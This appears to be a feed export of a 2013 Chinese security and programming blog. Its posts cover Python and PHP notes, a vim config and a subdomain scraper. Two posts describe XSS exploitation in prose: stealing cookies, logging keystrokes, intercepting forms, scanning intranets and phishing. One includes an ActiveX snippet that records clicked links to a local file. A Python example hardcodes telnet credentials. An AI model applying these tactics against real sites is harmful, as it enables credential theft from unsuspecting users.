<p>10.执行action请用{}括起来，想一步完成所有别忘了加后缀文件。</p>

<h1 id="11awk-nr2--nr11-print-0-file-单独取文本其中几行">11.awk ‘NR&gt;2 &amp;&amp; NR&lt;11 {print $0}’ file 单独取文本其中几行</h1>
<p><span style="color: #ff0000;"> <em><strong>本文是博主实践得来，内容简易，后续内容会续上，不喜可喷勿秽言。</strong></em></span>
<strong><span style="color: #00B050;">Enjoy yourself~</span></strong></p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[浅谈XSS的最大化利用]]></title>
      <url>/pentest/2013/10/21/e6-b5-85-e8-b0-88xss-e7-9a-84-e6-9c-80-e5-a4-a7-e5-8c-96-e5-88-a9-e7-94-a8/</url>
      <content type="html"><![CDATA[<p>我们知道，前端安全中的xss有多种利用方式，其中比较常见的便是用XSS打到的cookie卡入对方的网站，通过平台不断刷新登录从而获得持久控制权，或者通过权限控制不严直接getshell等等。
下面我们来简单谈谈几种稍微不一样的利用方式。
<span style="color: #00B050;">敏感信息探测</span>
我们在获取用户cookie无效时，可以尝试获取下其他有效数据，以方便我们判断管理的习惯或者进一步渗透的信息。
第一， 偷取浏览器信息，采用navigator的属性可以获取管理浏览器版本和flash插件情况，这样可以进行进一步的构造和其他设想。
第二， 使用Reffer偷取来源，如果在某些情况下不知道后台，我们可以尝试。管理可能在后台看见你的请求或留言进行点击或查看操作，我们如果能获取到reffer就相当于得到后台了。
第三， 重要参数的暴露，同样是Reffer，可能会泄露一些认证的重要参数，这有时可以等同于cookie的危害了。
第四， 获取管理的系统信息和硬件信息。获取系统信息需要建立Ajax对象，跨浏览器进行交互。
<span style="color: #00B050;">窃取密码</span>
同样，XSS作为多种利用方式的衍生物，是可以记录用户输入或者窃取用户浏览器保存的的其他重要信息的，这点在网站被设置了httponly后尤为有用。
第一， 记录用户输入，我们可以在用户在表单输入完毕，截获onsubmit动作时发送所有输入框里的值，期间可以通过onchange做辅助修正。
第二， 键盘记录，通过键入和点击事件，取得当前的keycode或者charcode，记录发送到我们的控制端。这里注意下，以上两种为dom下的区别，通过keydown和keypress事件在不同浏览器获取的不同，我们需要仔细结合浏览器参考使用最合适的。
第三， 截获密码，由于现而今用户输入在浏览器中为动态保存，在源代码中已不能看到明文，所以可以尝试动态创建表单，仿当前页面，在目标提交到服务端前完成填充。
做到这点并不难，因为本地截获是优先于服务端判断的（适用于ie）。
第四， 高仿钓鱼，这点就不多介绍了。
<span style="color: #00B050;">批量扫描</span>
利用XSS，我们还可以针对主机进行批量扫描，听起来可能有些奇葩，可事实就是这样。但是我们得意识到的是，JS请求效率并不高，也不能并发，所以我们要最大化利用这个点就只能对内网就行扫描。那么JS在这儿如何进行工作呢，我们可以做如下尝试：
第一，直接请求，比如，对ip端口进行请求，为一系列IP建立一个数组，取另一个数组储存要请求的端口号。如:http://hosts:port，判断返回状态，建议最好端口号取一个就好。当然，这种判断是不太稳定的，不过也是一种参考法子。
第二，如果我们想效率高些可以通过ajax发起跨域请求，调用XDomainRequest或者XMLHttpRequest进行对url的打开的请求，通过返回值判断。其中加上timeout的时间，更稳定一些。
<span style="color: #00B050;">XSS远控</span>
大家都知道，cookie在平台上是动态刷新的，这就意味着我们可以对服务端进行持续控制
第一， 在我的猜想里，一定程度上框架化对cookie的进行整体利用，附上可更改id名的固定POST内容（类似于hackbar的半自动化提交），我们就可以让XSS做成类似远控的效果了，好像鬼哥在以前弄个一个这样的非平台客户端，不知道是不是相同原理。
第二，不过在更多的定义中，XSS远控应该是让远控指令在目标浏览器上实时执行，并且回
显。从而实现实时地对被控主的Web状态的控制。当然发起请求的方式和连接方法有许多，
我们要在稳定性上多下功夫可以综合思考，这里就不多说了。
最后总结一下，XSS利用方法很多，我这里指讲了一小部分个人觉得有点非主流的，还有部
分如跨域和蠕虫是很值得研究的。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（三）]]></title>
      <url>/coding/2013/10/03/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-b8-89-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #ff0000;">1.telnetlib模块的几个小技巧：</span>
<span style="color: #00B050;">(1)神奇的read_very_eager()</span>
telnetlib模块里的read方法，其说是兼容性较好的，在取得数据完整性和结束符定位做的比较完美，不过，记得设置延时，
待数据抓取完再行第二次查询。
<span style="color: #00B050;">(2)telnet直接模拟登陆获取的数据，可以抓取到一些敏感信息记录。</span>
参考代码：</p>
<pre lang="python">#encoding=utf-8
def do_telnet(Host, username, password, finish, commands):
    import telnetlib
    '''Telnet远程登录：Windows客户端连接Linux服务器'''
    # 连接Telnet服务器
    tn = telnetlib.Telnet(Host, port=23, timeout=10)
	tn.set_debuglevel(2)
    # 输入登录用户名
    tn.read_until('login: ')
    tn.write(username + '\n')
    # 输入登录密码
    tn.read_until('password: ')
    tn.write(password + '\n')     
    # 登录完毕后执行命令
    tn.read_until(finish)
    for command in commands:
        tn.write('%s\n' % command)
    #执行完毕后，终止Telnet连接（或输入exit退出）
    tn.read_until(finish)
    tn.close() # tn.write('exit\n')
if __name__=='__main__':
	 # 配置选项
	Host = '10.255.254.205' # Telnet服务器IP
	username = 'administrator'   # 登录用户名
	password = 'dell1950'  # 登录密码
	finish = ':~$ '      # 命令提示符
	commands = ['echo "test"']
	do_telnet(Host, username, password, finish, commands)</pre>
<p>参考：http://blog.csdn.net/five3/article/details/8099997
<span style="color: #ff0000;">2.多线程小见：</span>
<span style="color: #00B050;">(1)当多线程共享一个东西时，</span>可以采用Queue.Queue，通过队列是否为空实施控制，进行锁信号和同步。
<span style="color: #00B050;">(2)抛弃thread，投向threading的怀抱。</span>过去小弟试过几回thread写多线程，采用了start_new_thread()，写法更加复杂,线程难以很好的控制，而且功能不如threading强大。新版py差不多抛弃了这种写法。
附上参考代码：</p>
<pre lang="python">import threading
import time
class timer(threading.Thread): #The timer class is derived from the class threading.Thread
    def __init__(self, num, interval):
        threading.Thread.__init__(self)
        self.thread_num = num
        self.interval = interval
        self.thread_stop = False 
    def run(self): #Overwrite run() method, put what you want the thread do here
        while not self.thread_stop:
            print 'Thread Object(%d), Time:%s/n' %(self.thread_num, time.ctime())
            time.sleep(self.interval)
    def stop(self):
        self.thread_stop = True 
def test():
    thread1 = timer(1, 1)
    thread2 = timer(2, 2)
    thread1.start()
    thread2.start()
    time.sleep(10)
    thread1.stop()
    thread2.stop()
    return 
if __name__ == '__main__':
    test()</pre>
<p><span style="color: #00B050;">(3)主进程结束后，子进程一般要过一段时间才结束，</span>从而完成收尾工作。如果我们想在主进程结束的时候，子进程也结束的话，我们就应该使用setDaemon（）函数。
<span style="color: #00B050;">（4）没啥好说的，同步所需要锁</span>==&gt;threading.RLock()，所有“临界区”都封闭在同一锁对象的acquire()和release()方法调用之间。
参考：http://blog.csdn.net/lazy_tiger/article/details/3861844 ===================&gt;Python多线程学习(连载)
http://www.cnblogs.com/rollenholt/archive/2011/08/09/2131719.html===========&gt;python多线程学习(细节)
<span style="color: #00B050;">(5)设置timeout不如sleep，</span>前者只是在初始化socket连接时起作用，而一旦连接成功后如果出现等待那就不会起作用。适当沉睡可以等到线程结束，便于同步,最后可以用join设置超时控制。
<span style="color: #ff0000;">3.os模块小总结</span>
<span style="color: #00B050;">(1)简单说是取得a文件属性然后覆盖b文件。</span></p>
<pre lang="python">import os
import stat, time
infile = "samples/sample.jpg"
outfile = "out.jpg"
# copy contents
fi = open(infile, "rb")
fo = open(outfile, "wb")
while 1:
    s = fi.read(10000)
    if not s:
        break
    fo.write(s)
fi.close()
fo.close()
# copy mode and timestamp
st = os.stat(infile)
os.chmod(outfile, stat.S_IMODE(st[stat.ST_MODE]))
os.utime(outfile, (st[stat.ST_ATIME], st[stat.ST_MTIME]))
print "original", "=&gt;"
print "mode", oct(stat.S_IMODE(st[stat.ST_MODE]))
print "atime", time.ctime(st[stat.ST_ATIME])
print "mtime", time.ctime(st[stat.ST_MTIME])
print "copy", "=&gt;"
st = os.stat(outfile)
print "mode", oct(stat.S_IMODE(st[stat.ST_MODE]))
print "atime", time.ctime(st[stat.ST_ATIME])
print "mtime", time.ctime(st[stat.ST_MTIME])</pre>
<p><span style="color: #00B050;">(2)命令执行和程序调用</span>
execfile() #直接编译执行
os.execl(path, arg<em>)
os.execvp(program,arg</em>) #需要指定程序类型
eval()
os.system(cmd)
<span style="color: #00B050;">(3)使用 _ <em>import</em> _ 函数获得特定函数</span></p>
<pre lang="python">def getfunctionbyname(module_name, function_name):
    module = _ _import_ _(module_name)
    return getattr(module, function_name)
print repr(getfunctionbyname("dumbdbm", "open"))</pre>
<pre><span style="color: #00B050;">(4)使用 os 模块调用其他程序 </span>======================WIN========================</pre>
<pre lang="python">import os
import sys
def run(program, *args):
    pid = os.fork()
    if not pid:
        os.execvp(program, (program,) +  args)
    return os.wait()[0] 
run("python", "hello.py")
print "goodbye"</pre>
<p>=====================UNIX========================</p>
<pre lang="python">import os
import string 
def run(program, *args):
    # find executable
    for path in string.split(os.environ["PATH"], os.pathsep):
        file = os.path.join(path, program) + ".exe"
        try:
            return os.spawnv(os.P_WAIT, file, (file,) + args)
        except os.error:
            pass
    raise os.error, "cannot find executable" 
run("python", "hello.py")
print "goodbye"</pre>
<p><span style="color: #00B050;">(5)</span>os.environ[“PATH”],os.pathsep===&gt;系统路径分隔符,compile 函数检查语法</p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PYTHON学习札记（二）]]></title>
      <url>/coding/2013/10/02/python-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-ba-8c-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #ff0000;">1.stat模块:</span>
对于文件的状态能直接获取，通过集合分别赋值给几个变量（注意，不超过10项），说到底就是获取的文件描述符的状态。</p>
<pre lang="python">import os
import time 
file = "../src/xx.txt"
def dump( st ):
    mode, ino, dev, nlink, uid, gid, size, atime, mtime, ctime = st
    print "- size:", size, "bytes"
    print "- owner:", uid, gid
    print "- created:", time.ctime( ctime )
    print "- last accessed:", time.ctime( atime )
    print "- last modified:", time.ctime( mtime )
    print "- mode:", oct( mode )
    print "- inode/dev:", ino, dev 
    st = os.stat( file )
    print "stat", file
    dump( st )</pre>
<p>还有种类似的法子:</p>
<pre lang="python">fp = open( file )
st = os.fstat( fp.fileno() )</pre>
<p>相当于先获取I/O操作句柄，再获取状态，比上面一个法子稍复杂。</p>

<p><span style="color: #ff0000;">2.大杂烩</span>
（1）os.path的全自动化文件名分割。
(2)集合操作</p>
<pre lang="python">import operator
sequence = 1, 2, 4
print "add", "=&gt;;", reduce(operator.add, sequence)
print "sub", "=&gt;;", reduce(operator.sub, sequence)</pre>
<p>其实吧，上面的亮点不是operater，前面的py内建函数reduce才是[（1,2）+3] =&gt;无限循环处理数组集合的主,编程时将给我们带来
一定的便捷性。至于operater本身，是个集合操作的好手，定位，分割，组合，确定有无，等等，非常方便。
事见：http://blog.csdn.net/lindaydk/article/details/6314444
（3）循环读取文本</p>
<pre lang="python">import fileinput
import sys
for line in fileinput.input( "xx.txt" ):
    sys.stdout.write( "-&gt; " )
    sys.stdout.write( line )</pre>
<p>若采用glob.glob模块可以直接匹配多个文件和路径，批量循环读取！
(4)shutil模块
可以使用shutil复制整个目录,然后删除目录。
shutil.copytree[,rmtree,copy]
(5)捕获输入输出
cStringIO和StringIO。
(6)字典和列表的添加貌似特殊构造挺麻烦，可以采用其他法子。
事见：http://www.cnblogs.com/rollenholt/archive/2011/08/08/2131053.html</p>

<p><span style="color: #ff0000;">3.pickle模块的基本使用</span>
pickle模块主要特点为通过句柄就直接能完成文件操作，不知道是否类似于管道？其两个主要函数是dump()和load()。dump()函数接受一个文件句柄和一个数据对象作为参数，把数据对象以特定的格式保存到给定的文件中。当我们使用load()函数从文件中取出已保存的对象时，pickle知道如何恢复这些对象到它们本来的格式—–可以用于反弹交互，后门，socket？
<strong>待续。。。。。。。。。</strong></p>

<p>后记:查阅了网上一部分资料，感谢Rollen Holt。</p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[《XSS跨站攻防》读书笔记-钓鱼的思考与延伸]]></title>
      <url>/tips/2013/09/26/e8-af-bb-e4-b9-a6-e7-ac-94-e8-ae-b0-xss-e9-92-93-e9-b1-bc-e7-9a-84-e6-80-9d-e8-80-83-e4-b8-8e-e5-bb-b6-e4-bc-b8/</url>
      <content type="html"><![CDATA[<p>邱哥文中的一句话说的很好，现在对于cookie限制采用了很多技术，比如令牌验证，比如会话过期时间，卡的比较死算是httponly，一旦使用，如果一旦是域全局限制，整个一个痛字了得！
由此而论，钓鱼手法是一种针对低权限下较为保守的做法，而且具有一定的可靠性，在取得真实帐密后，也免去了复杂加密的痛苦。当然，前提是，你能懂得欺骗的艺术—事见凯文米特尼克的大作。
目前市面上流传的xss钓鱼手法不少，本来么，在互联网大众化的时代，没有你做不到的，只有你想不到的。传统的互联网的钓鱼手法很多都可以改装后运用到xss上。
第一：重定向和伪造，这两种小弟认为是不太具有太大的诱惑力的，一般只能骗骗不小心的孩纸，在网友日益增长的意识面前，不改变网址的高仿的页面已经不太够看了，当然内嵌表单和单点覆盖还是个不错的手法，如果对网站不够熟悉，很可能就在不经意的位置中招而了无所知。
在这里小弟补充一点自己的看法，举个栗子，clickjacking是一种好的法子，他会通过某种诱惑，比如以苍、武二老师的温柔乡作幌子，欺骗你去点击一个你看不到的，且不该点击的东西。Form框输入欺骗也是一样，在取得你的输入后，他也许会试图传值，post给真正的登陆页面，然后返回导向。你会发现，你已经登陆了。不过，你的个人隐私和帐密却已经悄悄的 被copy到了某处，静静等待着罪恶的发生。
第二：关于“高级”钓鱼，就以邱哥思想来说，就是在更加隐蔽的层次进行劫持和记录（话说邱哥貌似还删了一部分比较完整的，没能看上原稿甚是遗憾）。其中一种手法便是在表单submit时截获数据，通过节点取得我们所需的value。当然，我们取得数据的触发和时机也可以换。比如可以在在输入最后一个登陆框之后进行一个快速的遍历（可以避免故意输入错误或者截获数据的完整性），因为JS本地执行是优先于服务端的反应的。而另一种，小弟并不太喜欢，即键盘记录劫持钓鱼（不知道以后杀软会不会根据特征和行为对此劫持报毒），使用JS自带的触发可以做许多的事。
小弟尝试写了下点击劫持，360并没有报危险，看来杀软BS模式的特征行为也许有待改进，不过版本稍微新点的浏览器会有提示或者直接过滤。
<span style="color: #ff0000;"> &lt;html&gt;</span>
<span style="color: #ff0000;">&lt;head&gt;</span>
<span style="color: #ff0000;">&lt;script&gt;</span>
<span style="color: #ff0000;">function txt(sb)</span>
<span style="color: #ff0000;">{</span>
<span style="color: #ff0000;">//window.alert(“F4ck!!”);</span>
<span style="color: #ff0000;">  var fso, f1;</span>
<span style="color: #ff0000;">  var ForReading=1;</span>
<span style="color: #ff0000;">  fso=new ActiveXObject(“Scripting.FileSystemObject”);</span>
<span style="color: #ff0000;">  f1=fso.CreateTextFile(“c:\hack.txt”,true);</span>
<span style="color: #ff0000;">  f1.WriteLine(sb.getAttribute(“href”));</span>
<span style="color: #ff0000;">  f1.WriteBlankLines(1);</span>
<span style="color: #ff0000;">  f1.Close();</span>
<span style="color: #ff0000;">}</span>
<span style="color: #ff0000;"> &lt;/script&gt;</span>
<span style="color: #ff0000;">&lt;/head&gt;</span>
<span style="color: #ff0000;">&lt;body&gt;</span>
<span style="color: #ff0000;">&lt;a href=”http://www.baidu.com” onclick=”txt(this)”&gt;baidu&lt;/a&gt;</span>
<span style="color: #ff0000;">&lt;a href=”http://www.google.com.hk” onclick=”txt(this)”&gt; google&lt;/a&gt;</span>
<span style="color: #ff0000;">&lt;a href=”http://blog.hellsec.net” onclick=”txt(this)”&gt; blog&lt;/a&gt;</span>
<span style="color: #ff0000;">&lt;/body&gt;</span>
<span style="color: #ff0000;">&lt;/html&gt;</span>
<a href="http://blog.hellsec.net/wp-content/uploads/2013/09/1.png"><img class="alignnone size-medium wp-image-195" title="1" src="http://blog.hellsec.net/wp-content/uploads/2013/09/1-300x111.png" alt="" width="300" height="111" /></a>
<a href="http://blog.hellsec.net/wp-content/uploads/2013/09/2.png"><img class="alignnone size-medium wp-image-196" title="2" src="http://blog.hellsec.net/wp-content/uploads/2013/09/2-300x74.png" alt="" width="300" height="74" /></a>
其中代码中的本地路径也许可以配置为公网肉鸡的远程路径，配置好可写入不可执行权限？聪明的各位朋友应该可以做更多的尝试。
以上是小弟自己的想法，按邱哥的意思应该是通过截获表单或者监听键盘，通过JS动态生成表单发送出去，如图：
<a href="http://blog.hellsec.net/wp-content/uploads/2013/09/3.png"><img class="alignnone size-medium wp-image-197" title="3" src="http://blog.hellsec.net/wp-content/uploads/2013/09/3-300x135.png" alt="" width="300" height="135" /></a>
以上应该算是箱子原理，由更加强大的脚本语言动态接受参数，生成条目，可存入数据库，减少了中介部分，也是更为普遍、稳定的做法。</p>
]]></content>
      <categories>
        
          <category> tips </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[PHP学习札记（二）]]></title>
      <url>/coding/2013/09/24/php-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-ba-8c-ef-bc-89/</url>
      <content type="html"><![CDATA[<p><span style="color: #00B050;">1.对于assert的分析：</span>
估计不少人都知道，assert这个函数，此为php官方声明文档中，建议用于debug的。在执行时，效果类似于eval，返回true or false;只不过可容错，可执行不是特别符合规范的语句。说白点就是php中的@容错。当配合用上callback的方法，可以知道具体的出错信息。
个人觉得需要注意的几个小点：
（1）当被程序员用于调试时，最好调试完毕用其他替换，毕竟assert虽好，使用时需要开启开关ASSERT_ACTIVE以此来控制是否开启debug，实际运营环节是很容易被disable的。
（2）assert使用时很灵活，其本质是判断一个表达式是否成立，如用于奇技淫巧，可用于加密后对各种WAF的绕过。
（3）另外，注意下assert_option()的配置，几个细节很值得研究：
EX:assert_option()
默认值ASSERT_ACTIVE=1 //Assert函数的开关
ASSERT_WARNING =1 //当表达式为false时，是否要输出警告性的错误提示,issue a PHP warning for each failed assertion
ASSERT_BAIL= 0 //是否要中止运行；terminate execution on failed assertions
ASSERT_QUIET_EVAL= 0 //是否关闭错误提示，在执行表达式时；disable error_reporting during assertion expression evaluation
ASSERT_CALLBACK= (NULL) // 是否启动回调函数 user function to call on failed assertions</p>

<p><span style="color: #00B050;">2.劫持引出的来源分析：</span>
前段时间劫持快照蛮火，不知道现在如何，博主挺笨又胆儿小，没有作深入研究。至于劫持脚本如何判断爬虫可以借鉴一下。
（1）.htacess，一般放在网站的根目录，抑或htdocs下也是较常见的。主要用于对目录配置的二次覆盖，以及封禁特定IP地址的用户、只允许特定IP地址的用户。即使服务器是比较安全的那种，可以考虑不要使用它。打个比方，一个站群服务器，如果AllowOverride启用了.htaccess文件，则Apache需要在每个目录中查找.htaccess文件，因此，无论是否真正用到，启用.htaccess都会导致性能的下降。另外，对每一个请求，都需要读取一次.htaccess文件，并且如果启用的话，Apache必须在所有上级的目录中查找.htaccess文件。
（2）$_SERVER[‘HTTP_REFERER’]，其实重点是HTTP_REFFRER,在接收post包时，可能会出现，一般对应的是http的消息报头referer项，可以判断的是网页的定向来源，这在抓取post包时可以抓到。
（3）HTTP_USER_AGENT，也是$_SERVER的参数，可判断主机来源，这里需要注意的是，与上不同，上面的reffer判断的是主机地址，这个则需要匹配主机关键词如google、yahoo神马的。
（4）X-Forwarded-For，介个是博主自己添加的，一般在代表客户端，在服务器使用了负载均衡和代理时会使用，有时也会拿来判断真实IP或者来源（比如某些略坑的hack游戏）.</p>

<p><span style="color: #00B050;">3.不安全因素过滤引发的思考</span>
（1）htmlspecialchars()，许多php程序猿会用到的一个过滤器，此函数把一些预定义的字符转换为 HTML实体。如：” （双引号） 成为 “’ （单引号） 成为 &amp;#039。输出的转义的字符无法对浏览器造成跨站攻击(记得编码时双单引号的可编码性是可选的)。
（2）addslashes()，对字符进行转义。当magic_quotes_gpc=off时，此函数会对输入的字符进行加斜杠处理；当为on时，使用了此函数，输出应该用stripslashes()去掉多余的反斜杠。当然在这里我们需要注意宽字符‘縗’造成截断的影响（这里不再赘言）。值得一提的是，magic_quotes_gpc特性在PHP5.3.0中已经废弃并且在5.4.0中已经移除了，这对于转义显得更为灵活。
（3）参数化查询防止SQL注入（这里插一句，是补充的是mysql相关，与php并无太大关系。）,或许部分朋友会觉得这个在mssql开发里听到过，其实mysql里也可以实现的。那么，参数化查询是如何防止注入的呢。参数化查询中，可以重用执行计划，并且如果重用执行计划的话，SQL所要表达的语义就不会变化，所以就可以防止SQL注入。
MySqlConnection   myconn   =   new   MySqlConnection(constr);
 MySqlCommand   mycomm   =new   MySqlCommand(constr);
 strsql= “select   cust_id,cust_name   from   vt_frmcust   where   punid=？str1 “;
 mycomm.Parameters.Add( “？str1 “,MySqlDbType.VarChar,32);
 mycomm.Parameters[ “？str1 “].Value=Request[ “unid “]; 
在此之前，SQL语句如果中如果预计掺入了注入，可以先考虑sql语句拼接+过滤，不过动态执行SQL同样有风险。
mysql中的动态执行：
mysql&gt; SET @a=1;
mysql&gt; PREPARE STMT FROM “SELECT * FROM tbl LIMIT ?”;
mysql&gt; EXECUTE STMT USING @a;
预定义一个语句，并将它赋给 STMT,”？”参数带入，动态执行。PS: MySQL VER&gt;5.0.13,可用于存储过程，但仍不支持用于自定义函数。参考资料中有几个讨论有点意思，机油们可以看看：
<span style="color: #00ffff;">http://bbs.csdn.net/topics/380206077</span>
<span style="color: #00ffff;"> http://cs.now.cn/html/FAQ/service/201302/27-7014.html</span>
<span style="color: #00ffff;"> http://database.51cto.com/art/201301/377069.htm</span>
<span style="color: #00ffff;"> http://blog.csdn.net/moshuchao/article/details/2153342#</span></p>

]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Google隐藏次级域名抓取]]></title>
      <url>/coding/2013/09/07/google-e9-9a-90-e8-97-8f-e6-ac-a1-e7-ba-a7-e5-9f-9f-e5-90-8d-e6-8a-93-e5-8f-96/</url>
      <content type="html"><![CDATA[<p>最近忙着找实习，时间又忙，前几天本想找个内网啥的，结果接的任务的内网不是短时间搞得下来的。
但是昨儿有朋友跟我谈起二级域名抓取的问题，因为大家都知道，市面上有几款api查询次级域名，但是很多时候都查不完，邮局，快过期的域名，注册未名的，内网入口。尤其是不大不小的站，这种是在api中查不了的。关于因此昨儿写了个py，直接上东西。
如果有朋友对版权问题有异议，请私信博主更改和添加。
<span style="color: #00ffff;">优缺点：</span>
1.代码是借鉴了一部分别人的，其中包括（haxxxxx兄），毕竟小弟不是码农，代码看起来有点山寨。。
2.没有采用多线程，因为google api在没有连国外VPN时多线程2+就得崩，这种本来运行也不慢，所以综合考虑没有采用它。
3.最后整理为去重复的字典result.txt，可以直接导入御剑啥的。
4.中间产生了些临时文件，启动删除时可以清理。
5.没有采用win下必备的模块，跨平台性。。（话说haxxxxx兄写的东西真的挺好，不过基本每次都要加上win模块，让小弟好生伤心、）
6.最后，用法并非单一，功能大神们改进后继续发掘。
朋友的原创不错，比我这个好，代码也更简洁。不过我估计他博客有我就不发了。
友链里自己找出那位大神喔。
PS:本来想直接发他的。。。脸皮还是不够厚啊。</p>

<p><span style="color: #00ffff;">附件:</span>
<span style="color: #ff0000;"> 需要的第三方模块以及代码==&gt;</span>
<span style="color: #ff0000;"> 我传的百度盘：</span>
<a title="第三方模块" href="http://pan.baidu.com/share/link?shareid=1068142402&amp;uk=4113276289" target="_blank">http://pan.baidu.com/share/link?shareid=1068142402&amp;uk=4113276289</a>
<a title="代码文件" href="http://pan.baidu.com/share/link?shareid=1070462314&amp;uk=4113276289" target="_blank">http://pan.baidu.com/share/link?shareid=1070462314&amp;uk=4113276289</a></p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[python学习札记（一）]]></title>
      <url>/coding/2013/08/05/python-e5-ad-a6-e4-b9-a0-e6-9c-ad-e8-ae-b0-ef-bc-88-e4-b8-80-ef-bc-89/</url>
      <content type="html"><![CDATA[<p>本文本无高深内容，仅是实验时自行整理，看官莫喷。
由于本人不是特聪明，正则之类的特不喜欢用，因此，字符串截取、分割之类的成了小弟的最爱。
不过这篇正则写的不错，留下作为参考。
http://wiki.ubuntu.org.cn/Python正则表达式操作指南</p>

<p><span style="color: #ff0000;">第一：取字符串与查找</span>
<span style="color: #00ffff;">1.直接寻找字符串</span>
&gt;&gt;&gt; str = “xxxabxxx”
&gt;&gt;&gt; str.find(“ab”)
返回值为-1代表没有取到。
<strong>demo：string.find( substr, [start, [end]] )</strong>
记住去返回值最好单独赋值，不然容易出错。
参考文献：http://blog.csdn.net/ataraxia2010/article/details/6907907 （没有给出返回值）
<span style="color: #00ffff;">2.去掉指定字符串中指定的字符串</span>
参考文献：http://blog.csdn.net/ataraxia2010/article/details/6907907
import string
string.replace(s,”asd”,”“,1)
<strong>or:</strong>
import re
re.sub(“^asd”,”“,s)
与上方不同，直接print打印值会好些。
<span style="color: #00ffff;">3.”分割前中后”</span>
比如读一行到s，然后r,_,s=s.partition(‘指定字符串’)现在，r是不要的部分，s就是指定字符串后的部分，如果有结果的话，_的值也是指定字符串。</p>

<p><span style="color: #ff0000;">第二:python里的循环</span>
提醒一下，中断为continue,break为终断。循环和判断后的‘：’千万别忘了。
参考资料：
http://developer.51cto.com/art/201003/187652.htm
http://www.douban.com/note/242320366/
已经比较全面，略去不提。</p>

<p><span style="color: #ff0000;">第三:如何输出内容到文件</span>
<span style="color: #00ffff;">1. python test.py&gt;1.txt</span>
<span style="color: #00ffff;">2. 先调用以下语句就可以把print结果保存到文件了</span>
import sys
origin = sys.stdout
f = open(‘file.txt’, ‘w’)
sys.stdout = f</p>

<p>处理完之后,
sys.stdout = origin
f.close()
PS:网上摘录，使用时可能会出现一定问题。</p>

<p><span style="color: #00ffff;">3.c=”a string to print to file”</span>
f=open(‘out.txt’,’w’)
print &gt;&gt;f,c
f.close()
注意&gt;&gt;f后面要加逗号，否则会出错
书上说f=open(‘out.txt’,’a’)
试了不行，估计是权限问题。(网摘)</p>

<p>附上引起以上研究的学习代码：http://blog.sina.com.cn/s/blog_6b60096f01017c0f.html</p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[打造个性版vim]]></title>
      <url>/tips/2013/07/26/e6-89-93-e9-80-a0-e4-b8-aa-e6-80-a7-e7-89-88vim/</url>
      <content type="html"><![CDATA[<p>众所周知，vim是一种非常强大的IDE，不少朋友说他配合上插件几乎超越市面上任何一款编辑器。鄙人水平有限，对vim还处于待入门的阶段，经一位死党机油的精心指点和资料的查阅，终于更新了自己vim。
其实本文有点标题党的意味，主要不是给大家展示如何配置而是给大家说明如何在借鉴别人的配置或者在另一台电脑上复原vim配置时，中间需要注意的一些东西。</p>

<p>以下配置代码引自习科，这里就不多说了。</p>

<p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p>

<p><span style="color: #ff0000;">”———————基本设置————————-</span></p>

<p><span style="color: #ff0000;">“语言设置</span></p>

<p><span style="color: #ff0000;">set langmenu=zh_CN.UTF-8</span></p>

<p><span style="color: #ff0000;">set helplang=cn</span></p>

<p><span style="color: #ff0000;">“解决某些文档编码造成中文乱码的问题</span></p>

<p><span style="color: #ff0000;">set fileencodings=utf-8,gb18030,utf-16,big5</span></p>

<p><span style="color: #ff0000;">”——————————————————</span></p>

<p><span style="color: #ff0000;">syntax on “自动语法高亮</span></p>

<p><span style="color: #ff0000;">set mouse=a “所有模式下允许使用鼠标</span></p>

<p><span style="color: #ff0000;">set background=dark “设置背景颜色为Dark,让字体更加醒目</span></p>

<p><span style="color: #ff0000;">set nu “显示行号</span></p>

<p><span style="color: #ff0000;">set showcmd “显示输入命令</span></p>

<p><span style="color: #ff0000;">set smartindent “智能语法对齐</span></p>

<p><span style="color: #ff0000;">set foldenable “允许折叠</span></p>

<p><span style="color: #ff0000;">set foldmethod=manual “手动折叠</span></p>

<p><span style="color: #ff0000;">set shiftwidth=4 “代码缩进为4个字符</span></p>

<p><span style="color: #ff0000;">set softtabstop=4 “按一次Tab前进4个字符</span></p>

<p><span style="color: #ff0000;">set tabstop=4 “保存Tab宽度为4个字符</span></p>

<p><span style="color: #ff0000;">set history=300 “保存300条历史记录</span></p>

<p><span style="color: #ff0000;">set expandtab “使用空格代替制表符</span></p>

<p><span style="color: #ff0000;">set hlsearch “搜索高亮</span></p>

<p><span style="color: #ff0000;">set incsearch “搜素逐字高亮</span></p>

<p><span style="color: #ff0000;">set nowrapscan “禁止搜索到文件两端时重新搜索</span></p>

<p><span style="color: #ff0000;">set ignorecase smartcase “搜索时智能忽略大小写</span></p>

<p><span style="color: #ff0000;">set magic “设置魔术</span></p>

<p><span style="color: #ff0000;">set ttimeoutlen=100 “设置键码超时</span></p>

<p><span style="color: #ff0000;">colorscheme ron “ron配色方案</span></p>

<p><span style="color: #ff0000;">autocmd InsertEnter * se cul “进入编辑模式下高亮当前行</span></p>

<p><span style="color: #ff0000;">autocmd InsertLeave * se nocul “回到普通模式下取消高亮当前行</span></p>

<p><span style="color: #ff0000;">“vimrc修改之后自动加载</span></p>

